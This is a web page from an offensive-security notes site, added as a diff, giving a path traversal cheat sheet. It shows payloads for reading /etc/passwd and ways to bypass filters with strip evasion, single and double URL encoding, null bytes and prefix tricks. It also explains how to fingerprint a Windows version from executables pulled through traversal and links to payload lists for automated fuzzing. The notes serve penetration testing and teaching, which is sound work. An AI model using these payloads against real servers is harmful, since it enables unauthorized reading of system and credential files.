@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Explore path traversal vulnerabilities, including bypass techniques and exploitation methods. Learn how attackers use encoding, double encoding, and null bytes to access restricted files on servers.">
+  <title>offsecnotes | Path traversal</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Path traversal</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#general-info" id="toc-general-info">General info</a></li>
+<li><a href="#bypass-defenses" id="toc-bypass-defenses">Bypass defenses</a></li>
+<li><a href="#tips" id="toc-tips">Tips</a></li>
+<li><a href="#common-files" id="toc-common-files">Common files</a></li>
+<li><a href="#identify-windows-version" id="toc-identify-windows-version">Identify Windows version</a></li>
+<li><a href="#automation" id="toc-automation">Automation</a></li>
+</ul></div>
+  <hr>
+<h2 id="general-info">General info</h2>
+<p>Consider</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;/loadImage?filename=218.png&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>An attacker can request the following URL to retrieve the <code>/etc/passwd</code> file from the server’s filesystem.</p>
+<p><code>https://insecure-website.com/loadImage?filename=../../../etc/passwd</code></p>
+<hr />
+<h2 id="bypass-defenses">Bypass defenses</h2>
+<ul>
+<li>Elimination (strip): <code>../</code> -&gt; <code>....//</code>
+<ul>
+<li>Test: try to change the original request <code>GET /image?filename=1.jpg</code> to <code>GET /image?filename=../1.jpg</code></li>
+<li>If the file is loaded the code strip <code>../</code></li>
+</ul></li>
+<li>Encode: <code>../</code> -&gt; <code>%2e%2e%2f</code></li>
+<li>Double-encode: <code>../</code> -&gt; <code>%252e%252e%252f</code></li>
+<li>Require to start with the expected base folder es. <code>/var/www/images</code> -&gt; <code>filename=/var/www/images/../../../etc/passwd</code></li>
+<li>Require to end with an expected file extension es. <code>.png</code> -&gt; <code>filename=../../../etc/passwd%00.png</code></li>
+<li>Others</li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: On Windows, both <code>../</code> and <code>..\</code> are valid directory traversal sequences.</p>
+</blockquote>
+<hr />
+<h2 id="tips">Tips</h2>
+<ul>
+<li>Don’t always trust error messages
+<ul>
+<li><code>GET /image?filename=/etc/passwd</code> -&gt; “No such file”
+<ul>
+<li>Try to add null byte: <code>GET /image?filename=/etc/passwd%00</code></li>
+<li>Try to add null byte and extension: <code>GET /image?filename=/etc/passwd%00.png</code></li>
+</ul></li>
+</ul></li>
+<li>Combine the cases:
+<ul>
+<li>Example: <code>....//....//....//etc/passwd%00.jpg</code> (strip, double-encode, null byte, whitelist extension)</li>
+<li><code>%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg</code></li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="common-files">Common files</h2>
+<p><strong>Linux</strong>:</p>
+<ul>
+<li>https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt</li>
+</ul>
+<p><strong>Windows</strong>:</p>
+<ul>
+<li>Short list: https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-windows-list.txt</li>
+<li>Long list: https://github.com/soffensive/windowsblindread/tree/master</li>
+</ul>
+<blockquote>
+<p><strong>Tip</strong>: On Windows, you can also try using a different drive letter than <em>C:</em>.</p>
+</blockquote>
+<hr />
+<h2 id="identify-windows-version">Identify Windows version</h2>
+<ol type="1">
+<li><p>Retrieve a Microsoft executable from the target system:</p>
+<ul>
+<li><code>C:/Windows/explorer.exe</code></li>
+<li><code>C:/Windows/notepad.exe</code></li>
+<li><code>C:/Windows/system32/ntoskrnl.exe</code></li>
+</ul></li>
+<li><p>Check version information:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">exiftool</span> explorer.exe</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">OS</span> Version                      : 10.0</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Image</span> Version                   : 10.0</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Subsystem</span> Version               : 10.0</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Subsystem</span>                       : Windows GUI</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> Version Number             : 10.0.14393.7513</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Product</span> Version Number          : 10.0.14393.7513</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> Flags Mask                 : 0x003f</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> Flags                      : <span class="er">(</span><span class="ex">none</span><span class="kw">)</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> OS                         : Windows NT 32-bit</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Object</span> File Type                : Executable application</span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> Subtype                    : 0</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Language</span> Code                   : English <span class="er">(</span><span class="ex">U.S.</span><span class="kw">)</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Character</span> Set                   : Unicode</span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Company</span> Name                    : Microsoft Corporation</span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> Description                : Windows Explorer</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="ex">File</span> Version                    : 10.0.14393.7513 <span class="er">(</span><span class="ex">rs1_release.241021-1750</span><span class="kw">)</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Internal</span> Name                   : explorer</span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="ex">Legal</span> Copyright                 : © Microsoft Corporation. All rights reserved.</span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="ex">Original</span> File Name              : EXPLORER.EXE</span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a><span class="ex">Product</span> Name                    : Microsoft® Windows® Operating System</span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a><span class="ex">Product</span> Version                 : 10.0.14393.7513</span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a><span class="ex">[...]</span></span></code></pre></div></li>
+<li><p>Compare the version number with the following official table: https://learn.microsoft.com/en-us/windows/win32/sysinfo/operating-system-version.</p></li>
+</ol>
+<blockquote>
+<p><strong>Tip</strong>: Some operating systems may share the same version name (e.g., Windows 10 and Windows 11), which can make identification tricky. To accurately determine the OS version, check the build number (e.g., <code>14393</code>) and refer to this resource: https://www.gaijin.at/en/infos/windows-version-numbers. Alternatively, you can search the product version on Google for more information.</p>
+</blockquote>
+<hr />
+<h2 id="automation">Automation</h2>
+<p>Use intruder with this list: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt</a></p>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
